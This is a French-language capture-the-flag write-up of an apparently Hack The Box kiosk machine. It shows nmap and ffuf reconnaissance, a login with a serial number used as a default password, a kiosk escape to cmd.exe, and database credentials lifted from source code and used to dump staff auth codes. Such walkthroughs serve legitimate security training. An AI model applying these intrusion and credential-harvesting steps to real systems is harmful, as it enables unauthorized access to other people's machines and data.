# Port enum
```bash
nmap -sC -sV -Pn -p- 10.129.193.108
```

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -Pn -p- 10.129.193.108
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-03 09:55 +0100
Nmap scan report for 10.129.193.108
Host is up (0.021s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Did not follow redirect to /login
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-cors: GET POST PUT OPTIONS
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.43 seconds
```

Serveur web sur port 8443

# Listing du serveur web

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://10.129.193.108:8443/FUZZ -recursion -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0 -s
api
favicon.ico
login
```

http://10.129.193.108:8443/api/status

```json
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":58718}
```

Utiliser le serial number comme default password

Dans printer on a un username (KioskUser) et un password (K!0sk2026#)

Du coup on peut RDP dans le kiosk, une fois dedans quand on est en anglais on peut se log avec les identifants qui nous sont donnés.

Je coupe le scanner depuis le dashboard parce que c'est drole :)

![](Pasted%20image%2020261103104434.png)

Spoiler: C'est ce qu'il fallait faire, on clique sur le lien et ça nous fait spawn un edge

Ensuite on peut faire ctrl+o pour ouvrir un fichier et donc pouvoir invoquer cmd.exe

Puis en se balandant dans Desktop il y avait un flag

# Analyse sur le kisok pour passer root

```powershell
netstat -ano | findstr :3306
```

Dans C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database il y a un fichier index.ts avec un user et un passowrd

User: kiosk_app
Password: K!0sk_R3pl1ca#DB

On peut se connecter a la DB

```cmd
mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306
```

```SQL
SHOW DATABASES;
USE htb_airways;
SHOW TABLES;
DESCRIBE _htb_staff;
SELECT employee_id, email, auth_code, role, active FROM _htb_staff;
```

![](Pasted%20image%2020261103110624.png)